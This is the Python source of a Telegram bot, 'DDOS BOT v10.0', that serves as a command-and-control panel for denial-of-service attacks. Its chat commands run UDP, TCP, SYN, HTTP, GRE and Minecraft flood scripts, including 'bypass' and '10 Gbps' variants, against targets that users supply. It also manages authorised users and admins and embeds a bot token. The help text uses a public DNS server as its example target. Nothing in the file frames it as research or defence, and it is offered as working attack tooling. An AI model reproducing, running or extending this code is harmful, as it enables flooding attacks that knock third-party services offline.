#!/usr/bin/env python3
"""
💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀
All attack methods included - 10 Gbps+ Ready
"""

import telebot
import subprocess
import os
import threading
import time
import sys
import re
import signal
import psutil

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "8552745024:AAGF5KQ8Y5H-s0UqphhvKIaoZso2LSXouA")
ADMIN_IDS = os.getenv("ADMIN_IDS", "8908646607").split(",")
USER_FILE = "users.txt"

allowed_users = []
running_attacks = {}
bot = telebot.TeleBot(BOT_TOKEN)
lock = threading.Lock()

# ========== BASE DIRECTORY ==========
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ========== ATTACK SCRIPT MAP ==========
ATTACK_SCRIPTS = {
    # Basic attacks
    'udp': (os.path.join(BASE_DIR, "udp.py"), 500),
    'tcp': (os.path.join(BASE_DIR, "tcp.py"), 300),
    'syn': (os.path.join(BASE_DIR, "syn.py"), 300),
    'httpflood': (os.path.join(BASE_DIR, "httpflood.py"), 200),
    
    # Monster attacks
    'tudp': (os.path.join(BASE_DIR, "tudp.py"), 1500),
    'mc': (os.path.join(BASE_DIR, "mc.py"), 1000),
    'mcquery': (os.path.join(BASE_DIR, "mcquery.py"), 800),
    'mchandshake': (os.path.join(BASE_DIR, "mchandshake.py"), 600),
    
    # Bypass attacks
    'udpbypass': (os.path.join(BASE_DIR, "udpbypass.py"), 1200),
    'tcpbypass': (os.path.join(BASE_DIR, "tcpbypass.py"), 800),
    'gudp': (os.path.join(BASE_DIR, "gudp.py"), 1500),
    
    # 10 Gbps attacks
    'ultra': (os.path.join(BASE_DIR, "ultra.py"), 2000),
    'mega': (os.path.join(BASE_DIR, "megabot.py"), 1500),
    'nuclear': (os.path.join(BASE_DIR, "nuclear.py"), 2000),
    '10gbps': (os.path.join(BASE_DIR, "10gbps.py"), 3000),
    'maxpower': (os.path.join(BASE_DIR, "maxpower.py"), 2500),
    
    # 10 Gbps Bypass
    'udpbypass10g': (os.path.join(BASE_DIR, "udpbypass10g.py"), 3000),
    'tcpbypass10g': (os.path.join(BASE_DIR, "tcpbypass10g.py"), 2500),
    
    # C-based converted attacks
    'killall': (os.path.join(BASE_DIR, "killall.py"), 2000),
    'udppps': (os.path.join(BASE_DIR, "udp-pps.py"), 3000),
    'gre': (os.path.join(BASE_DIR, "gre.py"), 2000),
}

# ========== FUNCTIONS ==========

def load_users():
    try:
        with open(os.path.join(BASE_DIR, USER_FILE), "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user(user_id):
    with open(os.path.join(BASE_DIR, USER_FILE), "a") as f:
        f.write(f"{user_id}\n")

def kill_process_tree(pid):
    """Kill a process and all its children"""
    try:
        parent = psutil.Process(pid)
        children = parent.children(recursive=True)
        for child in children:
            try:
                child.kill()
            except:
                pass
        try:
            parent.kill()
        except:
            pass
    except:
        pass

def execute_attack(user_id, attack_type, target, port, duration):
    if not 1 <= port <= 65535:
        return False, "Port must be 1-65535"
    if not 1 <= duration <= 600:
        return False, "Duration must be 1-600 seconds"

    if attack_type not in ATTACK_SCRIPTS:
        return False, f"Unknown attack: {attack_type}"

    script_path, threads = ATTACK_SCRIPTS[attack_type]

    if not os.path.exists(script_path):
        return False, f"Script not found: {script_path}"

    try:
        # Create temp script with duration limit
        temp_script = f"/tmp/attack_{int(time.time())}_{attack_type}.py"
        
        # Read original script
        with open(script_path, 'r') as f:
            script_content = f.read()
        
        # Add timeout mechanism
        timeout_code = f'''
import os
import signal
import threading
import time

def stop_attack():
    try:
        os.kill(os.getpid(), signal.SIGTERM)
    except:
        pass

# Stop after {duration} seconds
timer = threading.Timer({duration}, stop_attack)
timer.daemon = True
timer.start()

# Also stop after duration+2 seconds as fallback
def fallback_stop():
    time.sleep({duration} + 2)
    try:
        os.kill(os.getpid(), signal.SIGKILL)
    except:
        pass
fallback_thread = threading.Thread(target=fallback_stop, daemon=True)
fallback_thread.start()
'''
        
        # Insert timeout code after imports
        lines = script_content.split('\n')
        insert_pos = 0
        for i, line in enumerate(lines):
            if line.startswith('import ') or line.startswith('from '):
                insert_pos = i + 1
        lines.insert(insert_pos, timeout_code)
        modified_script = '\n'.join(lines)
        
        with open(temp_script, "w") as f:
            f.write(modified_script)
        os.chmod(temp_script, 0o755)
        
        # Start the attack
        cmd = ["python3", temp_script, target, str(duration), str(threads)] if attack_type == 'gre' else ["python3", temp_script, target, str(port), str(duration), str(threads)]
        
        # Special handling for GRE (no port needed)
        if attack_type == 'gre':
            cmd = ["python3", temp_script, target, str(duration), str(threads)]
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )
        
        # Store process info
        with lock:
            if user_id not in running_attacks:
                running_attacks[user_id] = []
            running_attacks[user_id].append({
                'process': process,
                'pid': process.pid,
                'temp_script': temp_script,
                'attack_type': attack_type,
                'target': target,
                'port': port,
                'duration': duration,
                'threads': threads,
                'start_time': time.time()
            })

        return True, f"✅ {attack_type.upper()} attack started on {target}:{port} for {duration}s with {threads} threads"

    except Exception as e:
        return False, f"Error: {str(e)}"

def stop_user_attacks(user_id):
    with lock:
        if user_id not in running_attacks:
            return 0
        
        count = 0
        for attack in running_attacks[user_id]:
            try:
                pid = attack.get('pid')
                if pid:
                    kill_process_tree(pid)
                temp_script = attack.get('temp_script')
                if temp_script and os.path.exists(temp_script):
                    os.remove(temp_script)
                count += 1
            except:
                pass
        
        running_attacks[user_id] = []
        return count

def stop_all_attacks():
    total = 0
    with lock:
        for user_id in list(running_attacks.keys()):
            total += stop_user_attacks(user_id)
    return total

# ========== TELEGRAM COMMANDS ==========

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, """💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀

🔥 BASIC ATTACKS:
/udp <target> <port> <time> - UDP Flood
/tcp <target> <port> <time> - TCP Flood
/syn <target> <port> <time> - SYN Flood
/httpflood <target> <port> <time> - HTTP Flood

🔥 MONSTER ATTACKS:
/tudp <target> <port> <time> - TUDP Monster
/mc <target> <port> <time> - Minecraft Attack
/mcquery <target> <port> <time> - Minecraft Query
/mchandshake <target> <port> <time> - Minecraft Handshake

🔥 BYPASS ATTACKS:
/udpbypass <target> <port> <time> - UDP Bypass
/tcpbypass <target> <port> <time> - TCP Bypass
/gudp <target> <port> <time> - GUDP Flood

🔥 10 GBPS ATTACKS:
/ultra <target> <port> <time> - 2-5 Gbps
/mega <target> <port> <time> - 3-8 Gbps
/nuclear <target> <port> <time> - 5-10 Gbps
/10gbps <target> <port> <time> - 10 Gbps Guaranteed
/maxpower <target> <port> <time> - 10+ Gbps

🔥 10 GBPS BYPASS:
/udpbypass10g <target> <port> <time> - UDP Bypass 10G
/tcpbypass10g <target> <port> <time> - TCP Bypass 10G

🔥 C-BASED CONVERTED:
/killall <target> <port> <time> - TCP Amplification
/udppps <target> <port> <time> - UDP PPS Flood
/gre <target> <time> <threads> - GRE Protocol Attack

🛑 CONTROL:
/stopall - Stop your attacks
/status - Check attacks
/id - Get your ID
/check - Check attack status

👑 Admin:
/globalstop - Stop ALL attacks

Example: /10gbps 8.8.8.8 53 10""")

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, """💀 ALL COMMANDS 💀

BASIC:
/udp 1.2.3.4 80 60
/tcp 1.2.3.4 80 60
/syn 1.2.3.4 80 60
/httpflood 1.2.3.4 80 60

MONSTER:
/tudp 1.2.3.4 80 60
/mc 1.2.3.4 25565 60
/mcquery 1.2.3.4 25565 60
/mchandshake 1.2.3.4 25565 60

BYPASS:
/udpbypass 1.2.3.4 80 60
/tcpbypass 1.2.3.4 80 60
/gudp 1.2.3.4 80 60

10 GBPS:
/ultra 1.2.3.4 80 60
/mega 1.2.3.4 80 60
/nuclear 1.2.3.4 80 60
/10gbps 1.2.3.4 80 60
/maxpower 1.2.3.4 80 60

10 GBPS BYPASS:
/udpbypass10g 1.2.3.4 80 60
/tcpbypass10g 1.2.3.4 80 60

C-BASED:
/killall 1.2.3.4 80 60
/udppps 1.2.3.4 80 60
/gre 1.2.3.4 60 2000

CONTROL:
/stopall - Stop attacks
/status - Check attacks
/id - Get your ID
/check - Check attack status
/globalstop - Stop ALL (Admin)""")

@bot.message_handler(commands=['id'])
def id_command(message):
    bot.reply_to(message, f"Your ID: `{message.chat.id}`", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.chat.id)
    with lock:
        if user_id not in running_attacks or not running_attacks[user_id]:
            bot.reply_to(message, "📭 No active attacks")
            return
        
        msg = f"🔥 ACTIVE ATTACKS\n\n"
        for i, attack in enumerate(running_attacks[user_id], 1):
            try:
                is_running = psutil.pid_exists(attack['pid'])
            except:
                is_running = False
            
            status = "🟢 Running" if is_running else "🔴 Stopped"
            elapsed = int(time.time() - attack['start_time'])
            remaining = max(0, attack['duration'] - elapsed)
            
            msg += f"{i}. {attack['attack_type'].upper()} → {attack['target']}:{attack['port']}\n"
            msg += f"   ⏱️ Duration: {attack['duration']}s | Remaining: {remaining}s\n"
            msg += f"   📊 Status: {status}\n\n"
        
        bot.reply_to(message, msg)

@bot.message_handler(commands=['stopall'])
def stopall_command(message):
    user_id = str(message.chat.id)
    count = stop_user_attacks(user_id)
    bot.reply_to(message, f"✅ Stopped {count} attack(s)")

@bot.message_handler(commands=['globalstop'])
def globalstop_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    count = stop_all_attacks()
    bot.reply_to(message, f"✅ Stopped {count} global attacks")

@bot.message_handler(commands=['check'])
def check_command(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_users and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Not authorized")
        return
    
    result = subprocess.getoutput("ps aux | grep -E 'attack_.*\\.py' | grep -v grep | grep -v bot.py")
    if result:
        response = f"🟢 ATTACK RUNNING!\n\n```\n{result[:400]}\n```"
    else:
        response = "🔴 No attack running"
    
    files = subprocess.getoutput("ls -la /tmp/attack_*.py 2>/dev/null")
    if files and "No such file" not in files:
        response += f"\n\n📁 Temp files:\n```\n{files[:200]}\n```"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    bot.reply_to(message, """👑 ADMIN:
/add <userid> - Add user
/remove <userid> - Remove user
/allusers - List users
/globalstop - Stop ALL attacks""")

@bot.message_handler(commands=['add'])
def add_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /add <userid>")
        return
    new_user = parts[1]
    if new_user in allowed_users:
        bot.reply_to(message, f"User {new_user} already exists")
        return
    allowed_users.append(new_user)
    save_user(new_user)
    bot.reply_to(message, f"✅ User {new_user} added")

@bot.message_handler(commands=['remove'])
def remove_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /remove <userid>")
        return
    user_to_remove = parts[1]
    if user_to_remove not in allowed_users:
        bot.reply_to(message, f"User {user_to_remove} not found")
        return
    allowed_users = [u for u in allowed_users if u != user_to_remove]
    with open(os.path.join(BASE_DIR, USER_FILE), "w") as f:
        for u in allowed_users:
            f.write(f"{u}\n")
    bot.reply_to(message, f"✅ User {user_to_remove} removed")

@bot.message_handler(commands=['allusers'])
def allusers_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    if not allowed_users:
        bot.reply_to(message, "No users")
        return
    response = "👥 Users:\n"
    for uid in allowed_users:
        try:
            info = bot.get_chat(int(uid))
            username = f"@{info.username}" if info.username else "Unknown"
            response += f"• {username} (ID: {uid})\n"
        except:
            response += f"• ID: {uid}\n"
    bot.reply_to(message, response)

def make_handler(attack_type):
    def handler(message):
        user_id = str(message.chat.id)
        if user_id not in allowed_users and user_id not in ADMIN_IDS:
            bot.reply_to(message, "❌ Not authorized")
            return

        parts = message.text.split()
        
        # Special handling for GRE (no port)
        if attack_type == 'gre':
            if len(parts) != 4:
                bot.reply_to(message, f"Usage: /gre <target> <time> <threads>")
                return
            target = parts[1]
            duration = int(parts[2])
            threads = int(parts[3])
            port = 0  # GRE doesn't use port
        else:
            if len(parts) != 4:
                bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
                return
            target = parts[1]
            port = int(parts[2])
            duration = int(parts[3])

        try:
            if attack_type != 'gre':
                port = int(port)
            duration = int(duration)
        except:
            bot.reply_to(message, "❌ Port and time must be numbers")
            return

        if duration < 1 or duration > 600:
            bot.reply_to(message, "❌ Duration must be 1-600 seconds")
            return

        status_msg = bot.reply_to(message, f"⚡ Starting {attack_type.upper()} attack...")
        success, msg = execute_attack(user_id, attack_type, target, port, duration)
        
        if success:
            bot.edit_message_text(f"✅ {msg}\n\n⏱️ Attack will stop after {duration}s", chat_id=message.chat.id, message_id=status_msg.message_id)
        else:
            bot.edit_message_text(f"❌ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)

    return handler

# Register all attacks
attacks = [
    'udp', 'tcp', 'syn', 'httpflood', 
    'tudp', 'mc', 'mcquery', 'mchandshake',
    'udpbypass', 'tcpbypass', 'gudp',
    'ultra', 'mega', 'nuclear', '10gbps', 'maxpower',
    'udpbypass10g', 'tcpbypass10g',
    'killall', 'udppps', 'gre'
]

for attack in attacks:
    handler = make_handler(attack)
    handler.__name__ = f"handle_{attack}"
    setattr(sys.modules[__name__], handler.__name__, handler)
    bot.message_handler(commands=[attack])(handler)

# ========== MAIN ==========

if __name__ == "__main__":
    print("=" * 60)
    print("💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀")
    print("=" * 60)
    
    # Install psutil if not installed
    try:
        import psutil
    except:
        print("[!] Installing psutil...")
        os.system("pip3 install psutil")
        import psutil
    
    allowed_users = load_users()
    for admin in ADMIN_IDS:
        if admin not in allowed_users:
            allowed_users.append(admin)
            save_user(admin)
    
    print(f"[+] Loaded {len(allowed_users)} users")
    print(f"[+] Admin IDs: {ADMIN_IDS}")
    print(f"[+] Attack scripts: {len(ATTACK_SCRIPTS)}")
    print("=" * 60)
    print("[+] Bot running! Press Ctrl+C to stop.")
    bot.polling(none_stop=True)
